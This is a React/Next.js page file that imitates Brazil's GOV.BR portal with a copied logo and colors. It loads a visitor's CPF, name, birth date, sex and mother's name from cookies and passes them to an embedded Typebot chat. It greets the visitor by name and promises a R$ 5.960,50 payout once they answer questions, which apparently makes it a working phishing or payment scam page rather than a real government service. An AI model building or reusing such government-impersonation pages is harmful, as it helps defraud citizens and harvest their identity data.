import { Typebot } from '@/components/typebot'
import type { Metadata } from 'next'
import { cookies } from 'next/headers'
import { redirect } from 'next/navigation'

export const metadata: Metadata = {
  title: 'GOV.BR',
}

export default async function ChatPage() {
  const cookieStore = await cookies()
  const cpf = cookieStore.get('cpfFormated')?.value
  const utmTracking = cookieStore.get('utm_tracking')?.value
  const name = cookieStore.get('name')?.value
  const nascimento = cookieStore.get('nascimento')?.value
  const sexo = cookieStore.get('sexo')?.value
  const mae = cookieStore.get('mae')?.value

  if (!cpf) {
    redirect('/')
  }

  return (
    <div className="w-full bg-[#1351B4] min-h-screen">
      <div className="sticky bg-white top-0 h-[62px] border-b border-white/90 shadow-xl  w-full flex items-center px-8">
        <svg width="120" height="40" viewBox="0 0 120 40">
          <title>GOV.BR</title>
          <text x="0" y="30" className="text-4xl" letterSpacing="-2">
            <tspan fill="#2864AE" className="font-black">
              g
            </tspan>
            <tspan fill="#F7B731" className="font-black">
              o
            </tspan>
            <tspan fill="#27AE60" className="font-black">
              v
            </tspan>
            <tspan fill="#2864AE" className="font-black">
              .b
            </tspan>
            <tspan fill="#F7B731" className="font-black">
              r
            </tspan>
          </text>
        </svg>
      </div>
      <div className="px-5 mt-8">
        <div className="bg-white min-h-[724px] rounded-lg pt-10 px-6 space-y-6">
          <div>
            <p className="text-sm font-medium text-black text-center">
              Olá, <span className="font-bold">{name}</span>
            </p>
            <p className="text-sm font-medium text-black text-center">
              Para liberar seu saque é muito simples, responda as perguntas
              abaixos e saque seus{' '}
              <span className="font-bold">R$ 5.960,50</span>
            </p>
          </div>
          <Typebot
            cpf={cpf ? cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4') : ""}
            nome={name ? name.split(" ").map(word => word.charAt(0).toUpperCase() + word.slice(1).toLowerCase()).join(" ") : ""}
            sexo={sexo === "M" ? "Masculino" : sexo === "F" ? "Feminino" : ""}
            nascimento={nascimento ? nascimento.split(" ")[0].split("-").reverse().join("/") : ""}
            mae={mae ? mae.split(" ").map(word => word.charAt(0).toUpperCase() + word.slice(1).toLowerCase()).join(" ") : ""}
            utmTracking={
              utmTracking as {
                utm_source?: string | null
                utm_medium?: string | null
                utm_campaign?: string | null
                utm_term?: string | null
                utm_content?: string | null
              }
            }
          />
        </div>
      </div>
    </div>
  )
}
